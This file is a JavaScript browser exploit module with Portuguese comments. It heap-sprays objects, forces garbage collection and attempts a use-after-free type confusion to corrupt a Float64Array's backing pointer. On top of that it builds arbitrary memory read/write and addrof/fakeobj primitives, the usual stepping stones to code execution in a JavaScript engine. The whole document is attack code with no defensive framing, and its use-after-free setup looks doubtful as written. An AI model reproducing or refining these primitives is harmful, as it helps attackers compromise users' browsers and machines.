// js/script3/testArrayBufferVictimCrash.mjs (Revisão Final com Verificação)
// Foco: UAF robusto com verificação explícita para criar R/W e depois addrof/fakeobj.

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais para as Primitivas ---
let victim_array;
let original_victim_butterfly;
let corrupted_container_butterfly;

// Funções auxiliares de conversão
const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};

const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// --- Primitivas de Leitura/Escrita Arbitrária ---
function arb_write(where, what) {
    corrupted_container_butterfly[2] = itof(where.sub(8));
    victim_array[0] = itof(what);
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
}

function arb_read(where) {
    corrupted_container_butterfly[2] = itof(where.sub(8));
    const result = ftoi(victim_array[0]);
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
    return result;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Final com Verificação ---`, "test");

    try {
        // --- FASE 1: Construir Leitura/Escrita Arbitrária via UAF ---
        logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        createArbitraryRW(); // Esta função agora inclui verificação e pode lançar um erro.
        logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Construir e Validar addrof/fakeobj ---
        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");

        const addrof = (obj) => {
            victim_array[1] = obj;
            return arb_read(original_victim_butterfly.add(8));
        };

        const fakeobj = (addr) => {
            arb_write(original_victim_butterfly.add(8), addr);
            return victim_array[1];
        };

        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        // Validação
        const test_obj = { marker: 0xDEADBEEF };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0xDEADBEEF) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }

        document.title = "addrof/fakeobj SUCCESS!";
        return { success: true, message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!" };

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função que estabelece a confusão de tipos ---
function createArbitraryRW() {
    // Usamos uma classe para uma estrutura de objeto mais consistente
    class SprayObject {
        constructor() {
            this.p0 = 0; this.p1 = 0; this.p2 = 0; this.p3 = 0;
            this.p4 = 0; this.p5 = 0; this.p6 = 0; this.p7 = 0;
        }
    }

    let spray = [];
    for (let i = 0; i < 8192; i++) { // Spray mais agressivo
        spray.push(new SprayObject());
    }
    
    let dangling_ref_obj = new SprayObject();
    spray.push(dangling_ref_obj);

    victim_array = new Float64Array([13.37, 13.38, 13.39]);
    let container = {
        prop_A: null,
        prop_B: victim_array // A propriedade que queremos sobrepor
    };
    
    spray = null;
    triggerGC();

    let reclaimers = [];
    for (let i = 0; i < 4096; i++) {
        reclaimers.push(container);
    }
    
    // VERIFICAÇÃO CRÍTICA
    // A propriedade 'p1' do SprayObject deve agora sobrepor a 'prop_B' do container.
    // Verificamos se o tipo mudou de número para objeto.
    if (typeof dangling_ref_obj.p1 !== 'object' || dangling_ref_obj.p1 === 0) {
        // Se a verificação falhar, lançamos um erro claro em vez de deixar o exploit travar.
        throw new Error("Falha na verificação do UAF. A confusão de tipos não ocorreu.");
    }

    // Se a verificação passou, o UAF funcionou.
    logS3("    Verificação do UAF bem-sucedida! Confusão de tipos confirmada.", "good");
    
    corrupted_container_butterfly = dangling_ref_obj.p1;
    original_victim_butterfly = ftoi(corrupted_container_butterfly[2]);
}

function triggerGC() {
    try {
        let allocations = [];
        for (let i = 0; i < 128; i++) {
            allocations.push(new ArrayBuffer(1024 * 1024 * 8)); // Aloca 1GB no total para forçar GC
        }
    } catch(e) {}
}
